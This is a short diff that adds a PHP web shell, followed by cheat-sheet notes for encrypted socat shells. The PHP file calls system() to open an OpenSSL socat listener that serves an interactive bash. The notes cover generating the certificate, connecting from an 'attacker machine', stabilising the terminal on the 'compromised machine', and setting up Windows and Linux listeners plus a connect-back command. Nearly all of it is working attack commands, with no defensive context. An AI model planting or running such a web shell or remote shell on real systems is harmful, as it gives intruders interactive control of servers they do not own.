@@ -1,0 +1,25 @@
+<?php
+    system('socat OPENSSL-LISTEN:[RPORT],cert=[CERTFILE],verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane');
+?>
+
+generate encryption keys:
+  openssl req --newkey rsa:2048 -nodes -keyout [.key file] -x509 -days 362 -out [.crt file];
+  cat [.key file] [.crt file] > [.pem file];
+
+connect using:
+  socat socat OPENSSL:[RHOST]:[RPORT],verify=0 FILE:`tty`,raw,echo=0
+
+stabilize using:
+  export TERM=xterm
+
+(may not be necessary, but) stabilize size by:
+  open alternate terminal on attacker machine and run: stty -a
+  on compromised machine use: stty [rows/cols] [number]
+
+non-stable: 
+  windows listener: 
+    socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+  linux listener:   
+    socat OPENSSL-LISTEN:[RPORT],cert=shell.pem,verify=0 EXEC:"bash -li"
+  connect back:     
+    socat OPENSSL:[RHOST]:[RPORT],verify=0 -
